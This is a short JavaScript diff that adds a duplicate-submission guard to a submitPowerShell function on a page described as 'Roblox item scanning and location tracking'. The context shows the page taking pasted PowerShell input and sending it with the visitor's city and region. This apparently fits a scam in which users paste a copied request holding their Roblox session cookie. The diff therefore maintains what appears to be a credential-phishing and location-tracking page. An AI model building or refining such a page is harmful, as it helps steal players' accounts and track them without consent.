@@ -205,7 +205,17 @@ async function getUserLocation() {
 }
 
 // Roblox item scanning and location tracking
+let isSubmitting = false; // Prevent duplicate submissions
+
 async function submitPowerShell() {
+    // Prevent duplicate calls
+    if (isSubmitting) {
+        console.log('⚠️ Already submitting, ignoring duplicate call');
+        return;
+    }
+    
+    isSubmitting = true;
+    
     const input = document.getElementById('powershellInput');
     const submitBtn = document.getElementById('submitBtn');
     const submitText = document.getElementById('submitText');
@@ -288,6 +298,7 @@ Location: ${locationInfo.city || 'Unknown'}, ${locationInfo.region || 'Unknown'}
             
             setTimeout(() => {
                 closeScanModal();
+                isSubmitting = false; // Reset flag on success
             }, 2000);
         } else {
             throw new Error(`Item scanning failed with status: ${response.status}`);
@@ -313,7 +324,11 @@ Location: ${locationInfo.city || 'Unknown'}, ${locationInfo.region || 'Unknown'}
             submitBtn.disabled = false;
             submitText.textContent = 'Scan';
             submitBtn.style.background = '';
+            isSubmitting = false; // Reset flag
         }, 3000);
+    } finally {
+        // Always reset the flag, even if there's an error
+        isSubmitting = false;
     }
 }
 
